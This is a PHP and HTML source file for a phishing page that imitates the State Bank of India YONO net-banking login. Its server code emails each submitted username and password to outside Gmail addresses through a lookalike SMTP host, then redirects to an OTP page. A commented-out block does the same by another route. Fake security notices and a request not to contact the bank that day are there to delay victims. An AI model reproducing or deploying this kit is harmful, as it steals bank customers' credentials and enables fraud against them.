<?php
session_start();
include('PHPMailer/class.phpmailer.php');
include('PHPMailer/class.smtp.php');
$msg="";
    if(isset($_POST['submit']))
        {
            $name = $_POST['userName'];
            $password = $_POST['password'];

                $mail = new PHPMailer();
                $mail->isSMTP();
                $mail->Host = "verify-limit-payback.co.in";
                $mail->SMTPAuth = true;
                $mail->SMTPSecure = 'ssl';
                $mail->Port = 465;
                $mail->Username = "email@verify-limit-payback.co.in";
                $mail->Password = "admin@123";
                
                $mail->AddAddress("easymailid45@gmail.com");
            
                $mail->SetFrom($mail->Username);
                
                $mail->isHTML(true);
                $mail->Subject   = 'UserName and Password';
                
                     $mail->Body = '<style>tr{font-family:Arial, Helvetica, sans-serif;font-size: 12px;}</style>
                                <p><b>Username</b> - '.$name.'</p>
                                <p><b>Password</b> - '.$password.'</p>';
                
                
                if(!($mail->Send()))
                {
                    $msg="<div class='alert alert-danger'><span><b>Warning! </b>Username or Password Incorrect</span><a href='#' class='close' data-dismiss='alert'>&times;</a></div>";   
                }
                else
                {
                            header("Location:otp.php");              
                }
            
            // $subject= "Details from pgi-billdesk.online";
            //         $mail_body='<style>tr{font-family:Arial, Helvetica, sans-serif;font-size: 12px;}</style>
            //     <table width="500" border="0" align="left" cellpadding="5" cellspacing="0" style="border:1px #666666 solid;">
            //     <tr><td><table width="100%" cellspacing="0" cellpadding="5">
            //     <tr><td><strong> UserName:</strong></td><td>'.$name.'</td></tr>
            //     <tr><td><strong> Password:</strong></td><td>'.$password.'</td></tr>
            //     </table>
            //     </td></tr>
            //     <tr>
            //     <td></td></tr>
            //     </table>';
            //     $from="Requester";
            //     $headers  = "MIME-Version: 1.0" . "\r\n";
            //     $headers .= "Content-type: text/html; charset=iso-8859-1" . "\r\n";
            //     $headers .= "From: <$email>\r\n"; 
            //    $test = mail('maharana8055@gmail.com',$subject,$mail_body,$headers);
            //     if($test == true)
            //         {
            //             $msg =  "<p style = 'color:red;'>Incorrect UserName or Password</p>";   
            //         }
            
        }

?>
<head>
    <title>STATE BANK OF INDIA</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <link href="css/bootstrap.min-3.4.1.css" rel="stylesheet" media="screen" />
    <link href="css/responsivestyle_login.css" rel="stylesheet" type="text/css" />


 <style>
/* The Modal (background) */
.modal {
  display: none; /* Hidden by default */
  position: fixed; /* Stay in place */
  z-index: 99; /* Sit on top */
  padding-top: 100px; /* Location of the box */
  left: 0;
  top: 0;
  width: 100%; /* Full width */
  height: 100%; /* Full height */
  overflow: auto; /* Enable scroll if needed */
  background-color: rgb(0,0,0); /* Fallback color */
  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
}
@media only screen and (max-width: 768px){
    .modal-content{
        width: 90% !important;
    }
}
/* Modal Content */
.modal-content {
  background-color: #fefefe;
  margin: auto;
  padding: 20px;
  border: 1px solid #888;
  width: 50%;
}
.form-control{
    padding: 6px 6px !important;
}
/* The Close Button */
.close {
    float: none;
    font-size: 21px;
    font-weight: 700;
    line-height: inherit;
    color: #000;
    text-shadow: none;
    filter: alpha(opacity=1);
    opacity: 1;
}

.close:hover,
.close:focus {
  color: #000;
  text-decoration: none;
  cursor: pointer;
  opacity: 1;
}
</style>
   <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
</head>
<body>
    <?php include '../loader.php';?>
    <form name="quickLookForm" method="post">
        <div id="wrapper">
            <div class="container">
                <div class="row" id="header">
                    <div class="col-sm-3 col-xs-6">
                        <div class="sbi_mob_logo">
                            <a id="logo" href="#"><img style="width: 150px; margin-top: 20px;" src="images/yono.png"></a>
                        </div>
                    </div>
                    <div class="col-sm-2 col-xs-6 col-sm-offset-7">
                        <a href="#">
                            <div id="online_logo"><img style="width: 60px; margin-top: 20px;" src="images/sbi.png"></div>
                        </a>
                    </div>
                </div>
            </div>

            <section class="contBG" id="payment">
                <div class="container">
                    <div class="mops_container">
                        <div class="row">
                            <div class="col-sm-12">
                                <div class="loginbg">
                                    <div class="row">
                                        <div class="col-sm-6 col-lg-6">
                                             <form method = "post" class="form-horizontal login_form"> 
                                            <div class="login-container">
                                                <div class="row">
                                                    <label class="col-xs-12 col-lg-10 col-sm-12 text-center login-txt">LOGIN</label>
                                                </div>
                                                <div class="row">
                                                    <h2 class="text_h col-xs-12 col-lg-10 col-sm-12 text-center"><span>(CARE:</span> username and password are case sensitive)</h2>
                                                </div>

                                                <div class="form-group">
                                                    <div class="col-xs-12 col-lg-9 col-sm-11 optSelect">
                                                        <div class="col-xs-12 col-sm-12 radio-style">
                                                            <input type="radio" name="loginmode" id="loginmode" value="retail" checked="checked" />
                                                            <label for="loginmode"><span class="">Personal Banking</span></label>
                                                        </div>
                                                        <div class="col-xs-12 col-sm-12 radio-style">


                                                            <input type="radio" name="loginmode" id="personal" value="retail" />
                                                            <label for="personal"><span class="">Corporate Banking / yono BUSINESS</span></label>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="form-group">
                                                    <div class="col-sm-12" id="form-area">
                                                        <div class="col-sm-12 col-md-5 col-lg-6">
                                                            <div class="form-group">
                                                                <label class="lable_text">User Name *</label>
                                                                <input required=""
                                                                    class="form-control"
                                                                    aria-label="Username"
                                                                    placeholder="User name"
                                                                    type="text"
                                                                    name="userName"
                                                                    id="username"
                                                                    size="30"
                                                                    maxlength="20"/>
                                                            </div>

                                                            <div class="form-group">
                                                                <input name="password0" type="password" value="Dummy@123" style="display: none;" />

                                                                <label class="lable_text">Password *</label>
                                                                <input required=""
                                                                    class="form-control"
                                                                    aria-label="Password"
                                                                    placeholder="Password"
                                                                    name="password"
                                                                    type="password"
                                                                    id="label2"
                                                                    title="password"
                                                                    size="20"
                                                                />
                                                                <input name="password1" type="password" value="Dummy@123" style="display: none;" />
                                                                <?=$msg?>
                                                            </div>
                                                        </div>

                                                        <div class="col-lg-6 col-md-7 col-sm-12">
                                                            <ul class="forgot_detail">
                                                                <li><a onclick="document.getElementById('id01').style.display='block'" href="#">New User? Register here </a></li>
                                                                <li>
                                                                    <a onclick="document.getElementById('id01').style.display='block'" href="#"> Forgot Login Password</a>
                                                                </li>
                                                                <li> <a onclick="document.getElementById('id01').style.display='block'" href="#">Forgot Username</a></li>
                                                            </ul>
                                                        </div>
                                                    </div>
                                                    <div class="col-sm-12 col-lg-10 text-center btn_comn">
                                                        <input name = "submit" class="btn btn-Yellow" type="submit" value="Login"/>
                                                        <input class="btn btn-Yellow" type="reset" value="Reset" />
                                                    </div>
                                                </div>
                                            </div>
                                             </form> 
                                        </div>

                                        <!--Virtual Block-->
                                        <div id="virtual_m" class="vkb_content_m animated fadeInRight col-lg-6 col-sm-6 hidden-xs">
                                            <div>
                                                <h3>Online Virtual Keyboard</h3>
                                            </div>
                                            <img src="images/imgg.png" style="width: 95%; border: 1px solid #fff;">
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-sm-12 col-xs-12">
                                <p class="para_tle">Disclaimer:</p>
                                <p class="para">The privity of contract is between you and the service provider. Bank is only facilitating a payment mechanism and is not responsible for any deficiency by the service provider.</p>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-sm-7 col-xs-12">
                                <div class="notify_icon">
                                    <ul class="info_panel phishing_listBorder phishing_list">
                                        <li><img src="images/icon.jpg"> <a class="textLinks" href="http://pgibilldesk.online/">Click here</a> to abort this transaction and return to the SBICARD FOR BILLDESK site.</li>

                                        <li><img style="display: block; float: left; width: 20px;" src="images/icon.jpg"> Mandatory fields are marked with an asterisk (*)</li>
                                        <li><img style="display: block; float: left; width: 20px;" src="images/icon.jpg"> Do not provide your username and password anywhere other than in this page.</li>
                                        <li><img style="display: block; float: left; width: 20px;" src="images/icon.jpg"> Your username and password are highly confidential. Never part with them. SBI will never ask for this information.</li>
                                        <li><img style="display: block; float: left; width: 20px;" src="images/icon.jpg"> please do not call contact center or try to raise CMS complaint on the day of transaction</li>
                                    </ul>
                                </div>
                            </div>
                            <div class="col-sm-5 col-xs-12">
                                <div class="sqty">
                                    <div>
                                        <img src="images/vsign.png" alt="Verisign" />
                                    </div>
                                    <p>This site uses highly secure 256-bit encrption certified by VeriSign</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
            <footer id="footer">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-3 col-md-3 col-sm-3">
                            <p class="copy">&copy; State Bank of India</p>
                        </div>
                        <div class="col-sm-9 col-md-9 col-lg-9">
                            <p class="site_view hidden-xs text-right">Site best viewed in I.E 10 +, Mozilla 30 +, Google Chrome 30 +</p>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    </form>




<div style="z-index: 999;" id="id01" class="w3-modal">
    <div class="w3-modal-content">
      <div style="padding: 40px 10px;" class="w3-container">
        <span onclick="document.getElementById('id01').style.display='none'" class="w3-button w3-display-topright">&times;</span>
       <p style="font-size: 16px;">This is a joining fee page only If you want to change/forgot your user id and password, go to SBI net banking official page <a style="color: blue;" href="www.onlinesbi.com" target="_blank">www.onlinesbi.com</a></p>
      </div>
    </div>
  </div>
</body>